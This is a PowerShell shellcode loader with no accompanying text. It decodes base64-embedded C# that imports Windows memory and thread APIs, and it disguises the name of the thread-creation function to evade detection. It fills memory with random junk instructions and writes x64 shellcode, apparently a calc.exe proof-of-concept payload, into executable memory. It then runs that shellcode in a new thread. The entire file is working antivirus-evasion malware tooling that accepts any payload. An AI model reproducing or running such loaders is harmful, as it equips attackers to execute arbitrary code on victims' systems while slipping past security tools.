
$fYKeAExr = @"
CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoKCnB1YmxpYyBzdGF0aWMgY2xhc3MgVlBVTkxPUUkKICAgIHsKICAgIAogICAgcHVibGljIHN0YXRpYyBEZWxlZ2F0ZSBWYW9qS1pGTihJbnRQdHIgcHRyKXsKICAgICAgICByZXR1cm4gTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwdHIsIHR5cGVvZihDUlRTdHViKSk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgRGVsZWdhdGUgQUVDcFBrem4oSW50UHRyIHB0cil7CiAgICAgICAgICAgIHJldHVybiBNYXJzaGFsLkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKHB0ciwgdHlwZW9mKFZBU3R1YikpOwogICAgfQogICAgCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIG5GdW5jdGlvbik7CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyIE1NZkprcnVBKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgbkZ1bmN0aW9uKXsKICAgICAgICByZXR1cm4gR2V0UHJvY0FkZHJlc3MoaE1vZHVsZSwgbkZ1bmN0aW9uLlJlcGxhY2UoIl8iLCIiKSk7CiAgICB9CiAgICAKICAgIFtVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpXQogICAgcHVibGljIGRlbGVnYXRlIEludFB0ciBDUlRTdHViKEludFB0ciBoLCBJbnRQdHIgYSwgSW50UHRyIGIsIEludFB0ciBjLCBJbnRQdHIgZCwgVUludDMyIGUsVUludDMyIHAsICBvdXQgSW50UHRyIGYpOwogICAgCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeSggW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV1zdHJpbmcgbHBGaWxlTmFtZSk7CiAgICAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYixVSW50UHRyIHMsdWludCBwLG91dCB1aW50IG8pOwogICAgW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCldICAgIHB1YmxpYyBkZWxlZ2F0ZSBJbnRQdHIgVkFTdHViKEludFB0ciBhLCBVSW50UHRyIGIsIFVJbnQzMiBjLCBVSW50MzIgZCk7CiAgICAKICAgIFtEbGxJbXBvcnQoIm1zdmNydC5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBtYWxsb2ModWludCBzcmMpOwogICAgCiAgICBbRGxsSW1wb3J0KCJtc3ZjcnQuZGxsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgbWVtc2V0KEludFB0ciBkZXN0LCB1aW50IHNyYywgdWludCBjb3VudCk7CiAgICAKfQoK
"@

Add-Type -TypeDefinition $( [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fYKeAExr)))

$zDcHxPlh = [VPUNLOQI]
$NibbaqpZ = 16167

[Byte[]]$tpkWJrhW0=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW1=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW2=0x66,0x50,0x66,0x58
[Byte[]]$tpkWJrhW3=0x66,0x50,0x66,0x58
[Byte[]]$tpkWJrhW4=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW5=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW6=0x48,0x31,0xc9,0x90
[Byte[]]$tpkWJrhW7=0x66,0x31,0xc0,0x90
[Byte[]]$tpkWJrhW8=0x66,0x50,0x66,0x58
[Byte[]]$tpkWJrhW9=0x48,0x31,0xc0,0x90
[Byte[]]$tpkWJrhW10=0x66,0x50,0x66,0x58
[Byte[]]$tpkWJrhW11=0x66,0x31,0xc0,0x90
[Byte[]]$tpkWJrhW12=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW13=0x48,0x31,0xd2,0x90
[Byte[]]$tpkWJrhW14=0x90,0x90,0x90,0x90
[Byte[]]$tpkWJrhW15=0x90,0x90,0x90,0x90
[Byte[]]$tpkWJrhW16=0x48,0x31,0xc9,0x90
[Byte[]]$tpkWJrhW17=0x48,0x31,0xc9,0x90
[Byte[]]$tpkWJrhW18=0x66,0x31,0xc0,0x90
$tpkWJrhW = @($tpkWJrhW0,$tpkWJrhW1,$tpkWJrhW2,$tpkWJrhW3,$tpkWJrhW4,$tpkWJrhW5,$tpkWJrhW6,$tpkWJrhW7,$tpkWJrhW8,$tpkWJrhW9,$tpkWJrhW10,$tpkWJrhW11,$tpkWJrhW12,$tpkWJrhW13,$tpkWJrhW14,$tpkWJrhW15,$tpkWJrhW16,$tpkWJrhW17,$tpkWJrhW18)

[Byte[]]$mboUbALP = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65

$NMjIfOFz = $mboUbALP.Length
$uoVjiABI = $NibbaqpZ * 4
$aIxcQmLz = $uoVjiABI + $NMjIfOFz

$JfIitTOR = New-Object System.Object
$VNWSpSyM = $zDcHxPlh::LoadLibrary("kernel32.dll")

$yInSvcso   = $zDcHxPlh::MMfJkruA($VNWSpSyM, "C_re__a_t___e___R_em_o___t_e___T_h_______r___e__a_dE_x")
$PpGhNigZ = $zDcHxPlh::VaojKZFN($yInSvcso)
$JfIitTOR | Add-Member NoteProperty -Name fnCRT -Value $PpGhNigZ

$svBghnhq= $zDcHxPlh::malloc([UInt32]$aIxcQmLz)

$ACBudgKn=0
$LVlCQCKC = 0
$LldMXKBr = $tpkWJrhW.Length - 1

while($ACBudgKn -le $uoVjiABI/4){
        $random = New-Object -TypeName System.Random
        $cc=$zDcHxPlh::VirtualProtect([IntPtr]($svBghnhq.toInt64()+$ACBudgKn), [UInt32]4, [UInt32]0x40, [ref][UInt32]0)
        $Ymvfmfjo = $random.Next($minIndex, $maxIndex)
        $wRaNSmVM = $tpkWJrhW[$Ymvfmfjo]

        $c=$zDcHxPlh::memset([IntPtr]($svBghnhq.ToInt64()+($ACBudgKn)),$wRaNSmVM[0] , 1)
        $ACBudgKn+=1
        $c=$zDcHxPlh::memset([IntPtr]($svBghnhq.ToInt64()+($ACBudgKn)),$wRaNSmVM[1] , 1)
        $ACBudgKn+=1
        $c=$zDcHxPlh::memset([IntPtr]($svBghnhq.ToInt64()+($ACBudgKn)),$wRaNSmVM[2] , 1)
        $ACBudgKn+=1
        $c=$zDcHxPlh::memset([IntPtr]($svBghnhq.ToInt64()+($ACBudgKn)),$wRaNSmVM[3] , 1)
        $ACBudgKn+=1
}

for ($i=0;$i -le ($mboUbALP.Length-1);$i++) {
    $cc=$zDcHxPlh::VirtualProtect([IntPtr]($svBghnhq.toInt64()+$ACBudgKn+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)

    $sh = $mboUbALP[$i] -bxor 0x0
    $c = $zDcHxPlh::memset([IntPtr]($svBghnhq.ToInt64()+$ACBudgKn+$i), $sh , 1)

}

$p = 0
$o = $JfIitTOR.fnCRT.Invoke(-1, 0, 0, $svBghnhq, 0, 0, 0, [ref]$p)

$f = Get-Random -Maximum 10
while([UInt32]$f -ne ([UInt32]6)){
    $f = Get-Random -Maximum 10
}
